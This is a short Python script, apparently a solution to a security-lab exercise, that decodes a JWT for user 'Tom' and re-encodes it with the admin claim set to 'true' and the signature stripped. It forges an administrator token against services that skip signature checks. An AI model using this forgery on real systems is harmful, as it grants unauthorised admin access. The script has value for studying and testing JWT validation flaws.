# -*- coding:utf-8 -*-

#import jwt
import base64
# header
# eyJhbGciOiJIUzUxMiJ9
# {  "alg": "HS512"}
#payload 
#eyJpYXQiOjE1ODM3MTg4MzAsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.-28GH6wOwS7BlMvBEKY4AOpj99aYMVbb7GWcpeuwerkw3BsCVDXuP3cDTRgWhTBlFTxCyEkx-q-Dj-FJW_eWOA
# {"iat": 1583718830,  "admin": "false",  "user": "Tom"}

def b64urlencode(data):
    return base64.b64encode(data).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')

print(b64urlencode(b'{"alg":"HS512"}')+b'.'+b64urlencode(b'{"iat":1583718830,"admin":"true","user":"Tom"}')+b'.')